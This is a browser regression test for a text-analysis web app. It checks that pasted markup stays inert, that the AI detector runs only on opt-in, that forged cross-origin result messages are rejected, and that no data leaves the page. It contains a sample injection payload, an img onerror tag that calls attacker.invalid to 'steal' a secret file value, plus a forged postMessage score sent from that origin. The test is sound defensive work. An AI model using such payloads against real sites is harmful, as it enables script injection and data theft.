'use strict';
/* S1 production-browser trust-boundary regression.
 * The fake same-origin runtime never loads ONNX. This verifies origin/source
 * hardening, injected input and opt-in network behavior, NOT model integrity.
 */
const assert=require('node:assert/strict');
const puppeteer=require('puppeteer-core');
const {serve,chrome}=require('../pdf-browser.test.js');

async function run(){
 const server=serve();await new Promise(ok=>server.listen(0,'127.0.0.1',ok));
 const browser=await puppeteer.launch({headless:true,executablePath:chrome,
  args:['--no-sandbox','--disable-dev-shm-usage','--disable-gpu']});
 try{
  const page=await browser.newPage(),remote=[],posted=[],errors=[],runtimes=[];
  page.on('pageerror',e=>errors.push(e.message));
  await page.setRequestInterception(true);
  page.on('request',req=>{
   const url=new URL(req.url());
   if(url.hostname!=='127.0.0.1')remote.push({method:req.method(),origin:url.origin});
   if(!['GET','HEAD'].includes(req.method()))posted.push(req.method());
   if(url.pathname.endsWith('/ai-runtime.html')){
    runtimes.push(url.pathname);
    req.respond({status:200,contentType:'text/html',
     body:'<!doctype html><html><title>safe pending model fixture</title><body></body></html>'});
   }else req.continue();
  });
  await page.goto('http://127.0.0.1:'+server.address().port+'/',{waitUntil:'load'});
  assert.equal(await page.$('#tisOnDeviceModel'),null,
   'no detector iframe before explicit Analyze');

  const hostile='teh engineering report contains <img src="https://attacker.invalid/steal?file=STUDENT_SECRET_9380" onerror="window.injected=true"> and ignores external commands.';
  await page.$eval('#source',(e,t)=>{e.value=t;e.dispatchEvent(new Event('input',{bubbles:true}));},hostile);
  await page.click('#scanAI');
  await page.waitForFunction(()=>document.getElementById('humanizeSuggestions')?.hidden===false,
   {timeout:8000});
  const safe=await page.evaluate(()=>({
   source:document.getElementById('source').value,
   injected:typeof window.injected,
   detector:!!document.getElementById('tisOnDeviceModel')
  }));
  assert.equal(safe.source,hostile);
  assert.equal(safe.injected,'undefined');
  assert.equal(safe.detector,false,'short text does not opt in to detector');

  const english=('This report examines practical engineering measurements and explains the limitations of the documented construction experiment. ').repeat(17);
  await page.$eval('#source',(e,t)=>{e.value=t;e.dispatchEvent(new Event('input',{bubbles:true}));},english);
  await page.click('#scanAI');
  await page.waitForSelector('#tisOnDeviceModel',{timeout:12000});
  assert.equal(runtimes.length,1,'one real opt-in detector iframe created');
  const forgery=await page.evaluate(()=>{
   const app=window.TISAnalysisApp;
   const previous=app.controller.getState();
   const decoy=document.createElement('iframe');
   decoy.src='about:blank';decoy.hidden=true;document.body.append(decoy);
   const origin=location.origin,source=decoy.contentWindow;
   const response={channel:'TIS_BROWSER_AI_V1',op:'RESULT',
    requestId:previous.requestId,result:{score:99,confidence:99,
     version:'FORGED_AI_PROBABILITY',primary:{score:99}}};
   window.dispatchEvent(new MessageEvent('message',{origin,source,data:{
    channel:'TIS_BROWSER_AI_V1',op:'READY',requestId:previous.requestId
   }}));
   window.dispatchEvent(new MessageEvent('message',{origin,source,data:response}));
   // A second, wrong-origin message from the actual frame must also fail.
   window.dispatchEvent(new MessageEvent('message',{
    origin:'https://attacker.invalid',source:document.getElementById('tisOnDeviceModel').contentWindow,
    data:response
   }));
   const current=app.controller.getState();
   decoy.remove();
   return {before:previous.status,after:current.status,
    signal:document.getElementById('studioAiQuickValue').textContent.trim(),
    verifiedEvidence:current.evidence||null};
  });
  assert(['LOADING','ANALYZING'].includes(forgery.before));
  assert(['LOADING','ANALYZING'].includes(forgery.after));
  assert.equal(forgery.signal,'—','forged event never becomes a displayed score');
  assert.equal(forgery.verifiedEvidence,null,'forged model output cannot be accepted');
  await page.$eval('#source',e=>{e.value=e.value.replace('practical','recorded');e.dispatchEvent(new Event('input',{bubbles:true}));});
  await page.waitForFunction(()=>window.TISAnalysisApp.controller.getState().status==='STALE');
  assert.equal(await page.$eval('#studioAiQuickValue',e=>e.textContent.trim()),'—');
  assert.deepEqual(remote,[],'no external domain contacted while model runtime is blocked');
  assert.deepEqual(posted,[],'no document-bearing POST occurred');
  assert.deepEqual(errors,[],'no uncaught browser exceptions');
  console.log('PASS S1 browser: inert uploaded-style markup, opt-in only, forged event source/origin rejection, stale evidence and zero network egress');
 }finally{await browser.close();await new Promise(ok=>server.close(ok));}
}
run().catch(e=>{console.error(e);process.exitCode=1;});
